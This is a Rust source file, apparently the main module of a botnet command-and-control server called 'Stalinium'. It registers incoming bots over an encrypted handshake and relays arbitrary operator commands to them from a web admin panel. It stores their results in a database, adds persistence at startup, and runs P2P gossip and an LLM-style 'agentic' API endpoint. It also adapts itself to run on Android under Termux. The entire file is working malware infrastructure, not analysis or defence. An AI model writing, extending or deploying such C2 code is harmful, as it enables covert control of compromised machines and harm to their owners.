#![forbid(unsafe_code)]

mod commands;
mod config;
mod crypto;
mod encryption;
mod error;
mod p2p;
mod agentic;
mod persistence;
mod db;
mod termux;

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Instant;

use axum::{
    extract::State,
    http::StatusCode,
    response::Html,
    routing::{get, post},
    Json, Router,
};
use commands::{Command, CommandResult};
use config::Config;
use db::ServerDb;
use error::C2Error;
use serde::{Deserialize, Serialize};
use tokio::net::TcpListener;
use tokio::sync::{mpsc, RwLock};

pub struct AppState {
    bots: RwLock<HashMap<SocketAddr, BotHandle>>,
    results: RwLock<Vec<ResultEntry>>,
    config: Config,
    db: ServerDb,
}

struct BotHandle {
    addr: SocketAddr,
    connected_at: Instant,
    command_tx: mpsc::Sender<Command>,
}

struct ResultEntry {
    bot_addr: SocketAddr,
    command: String,
    result: String,
    timestamp: Instant,
}

#[derive(Serialize)]
struct BotInfo {
    addr: String,
    connected_secs: u64,
}

#[derive(Serialize)]
struct ResultInfo {
    bot_addr: String,
    command: String,
    result: String,
    seconds_ago: u64,
}

#[derive(Deserialize)]
struct CommandRequest {
    target: String,
    command: String,
    args: Vec<String>,
}

async fn admin_page() -> Html<&'static str> {
    Html(include_str!("admin.html"))
}

async fn list_bots(State(state): State<Arc<AppState>>) -> Json<Vec<BotInfo>> {
    let bots = state.bots.read().await;
    let infos: Vec<BotInfo> = bots.values().map(|b| BotInfo {
        addr: b.addr.to_string(),
        connected_secs: b.connected_at.elapsed().as_secs(),
    }).collect();
    Json(infos)
}

async fn send_command_handler(
    State(state): State<Arc<AppState>>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<String>, StatusCode> {
    let addr: SocketAddr = req.target.parse().map_err(|_| StatusCode::BAD_REQUEST)?;
    let bots = state.bots.read().await;
    if let Some(bot) = bots.get(&addr) {
        let cmd = Command {
            id: 0,
            command: req.command,
            args: req.args,
        };
        bot.command_tx.send(cmd).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        Ok(Json("Command queued".to_string()))
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

async fn get_results(State(state): State<Arc<AppState>>) -> Json<Vec<ResultInfo>> {
    let results = state.results.read().await;
    let infos: Vec<ResultInfo> = results.iter().map(|r| ResultInfo {
        bot_addr: r.bot_addr.to_string(),
        command: r.command.clone(),
        result: r.result.clone(),
        seconds_ago: r.timestamp.elapsed().as_secs(),
    }).collect();
    Json(infos)
}

async fn cluster_summary_handler(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    match state.db.cluster_summary() {
        Ok(summary) => Json(serde_json::to_value(summary).unwrap_or_default()),
        Err(e) => Json(serde_json::json!({"error": e.to_string()})),
    }
}

async fn bot_count_handler(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    match state.db.bot_count() {
        Ok(count) => Json(serde_json::json!({"connected": count})),
        Err(e) => Json(serde_json::json!({"error": e.to_string()})),
    }
}

async fn server_status_handler(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    let is_termux = termux::is_termux();
    let bot_count = state.db.bot_count().unwrap_or(0);
    let battery = if is_termux { termux::battery_status() } else { None };
    let local_ip = if is_termux { termux::local_ip() } else { None };

    let mut status = serde_json::json!({
        "platform": if is_termux { "android-termux" } else { std::env::consts::OS },
        "arch": std::env::consts::ARCH,
        "bots_connected": bot_count,
        "p2p_enabled": state.config.p2p.enabled,
        "agentic_enabled": state.config.agentic.enabled,
    });

    if let Some(bat) = battery {
        status["battery"] = serde_json::to_value(bat).unwrap_or_default();
    }
    if let Some(ip) = local_ip {
        status["local_ip"] = serde_json::json!(ip);
    }

    Json(status)
}

async fn handle_bot(
    mut socket: tokio::net::TcpStream,
    addr: SocketAddr,
    state: Arc<AppState>,
) {
    let handshake = match crypto::handshake::server_handshake(&mut socket).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("[!] Handshake failed with {}: {}", addr, e);
            return;
        }
    };
    let key = handshake.session_key;

    let (tx, mut rx) = mpsc::channel::<Command>(32);

    let _ = state.db.upsert_bot(&addr.to_string());

    state.bots.write().await.insert(addr, BotHandle {
        addr,
        connected_at: Instant::now(),
        command_tx: tx,
    });

    eprintln!("[+] Bot connected (PQ session): {}", addr);

    loop {
        match rx.recv().await {
            Some(cmd) => {
                let json = match serde_json::to_vec(&cmd) {
                    Ok(j) => j,
                    Err(_) => continue,
                };

                if encryption::send_encrypted(&mut socket, &json, &key).await.is_err() {
                    break;
                }

                match encryption::recv_encrypted(&mut socket, &key).await {
                    Ok(data) => {
                        if let Ok(result) = serde_json::from_slice::<CommandResult>(&data) {
                            let _ = state.db.insert_result(
                                Some(cmd.id as i64),
                                &addr.to_string(),
                                &cmd.command,
                                &result.result,
                            );
                            state.results.write().await.push(ResultEntry {
                                bot_addr: addr,
                                command: cmd.command,
                                result: result.result,
                                timestamp: Instant::now(),
                            });
                        }
                    }
                    Err(_) => break,
                }
            }
            None => break,
        }
    }

    let _ = state.db.disconnect_bot(&addr.to_string());
    state.bots.write().await.remove(&addr);
    eprintln!("[-] Bot disconnected: {}", addr);
}

#[tokio::main]
async fn main() -> Result<(), C2Error> {
    let config = Config::load();

    if termux::is_termux() {
        eprintln!("[*] Termux environment detected (Android, no root)");
        termux::acquire_wake_lock();
        termux::notify("Stalinium Server", "Starting up...");
    }

    persistence::add_persistence();

    let tcp_addr = config.settings.tcp_address.clone();
    let admin_addr = config.settings.admin_address.clone();
    let admin_addr_display = admin_addr.clone();

    if config.p2p.enabled {
        let gossip_addr: SocketAddr = config.p2p.gossip_address.parse()
            .expect("Invalid P2P gossip address");
        let bootstrap: Vec<SocketAddr> = config.p2p.bootstrap_peers.iter()
            .filter_map(|s| s.parse().ok())
            .collect();
        let overlay = Arc::new(
            p2p::overlay::Overlay::new(gossip_addr, bootstrap, config.p2p.max_peers)
        );
        let gossip = Arc::new(
            p2p::gossip::GossipEngine::new(gossip_addr, overlay)
                .await
                .map_err(|e| C2Error::P2pError(e.to_string()))?
        );
        gossip.start();
        eprintln!("[*] P2P gossip: {}", config.p2p.gossip_address);
    }

    if config.agentic.enabled {
        let agentic_state = Arc::new(
            agentic::transport::AgenticState::new(config.agentic.api_keys.clone())
        );
        let agentic_app = Router::new()
            .route("/v1/chat/completions", post(agentic::transport::handle_chat_completion))
            .route("/v1/models", get(agentic::transport::handle_models_list))
            .with_state(agentic_state);
        let listen_addr = config.agentic.listen_address.clone();
        tokio::spawn(async move {
            let listener = TcpListener::bind(&listen_addr).await.unwrap();
            eprintln!("[*] Agentic API: {}", listen_addr);
            axum::serve(listener, agentic_app).await.unwrap();
        });
    }

    let db_path = if termux::is_termux() {
        format!("{}/stalinium_server.db", termux::data_dir())
    } else {
        "stalinium_server.db".to_string()
    };
    let db = ServerDb::open(&db_path)
        .expect("Failed to open server database");

    let state = Arc::new(AppState {
        bots: RwLock::new(HashMap::new()),
        results: RwLock::new(Vec::new()),
        config,
        db,
    });

    let admin_state = state.clone();
    tokio::spawn(async move {
        let app = Router::new()
            .route("/", get(admin_page))
            .route("/api/bots", get(list_bots))
            .route("/api/command", post(send_command_handler))
            .route("/api/results", get(get_results))
            .route("/api/cluster", get(cluster_summary_handler))
            .route("/api/bot_count", get(bot_count_handler))
            .route("/api/status", get(server_status_handler))
            .with_state(admin_state);

        let listener = TcpListener::bind(&admin_addr).await.unwrap();
        eprintln!("[*] Admin panel: http://{}", admin_addr);
        axum::serve(listener, app).await.unwrap();
    });

    let listener = TcpListener::bind(&tcp_addr)
        .await
        .map_err(|e| C2Error::NetworkError(e.to_string()))?;
    eprintln!("[*] Listening for bots on {}", tcp_addr);

    if termux::is_termux() {
        let ip_info = termux::local_ip()
            .map(|ip| format!(" ({})", ip))
            .unwrap_or_default();
        termux::notify(
            "Stalinium Server",
            &format!("Running{} | TCP:{} Admin:{}", ip_info, tcp_addr, admin_addr_display),
        );
    }

    loop {
        let (socket, addr) = listener
            .accept()
            .await
            .map_err(|e| C2Error::NetworkError(e.to_string()))?;
        let bot_state = state.clone();
        tokio::spawn(async move {
            handle_bot(socket, addr, bot_state).await;
        });
    }
}
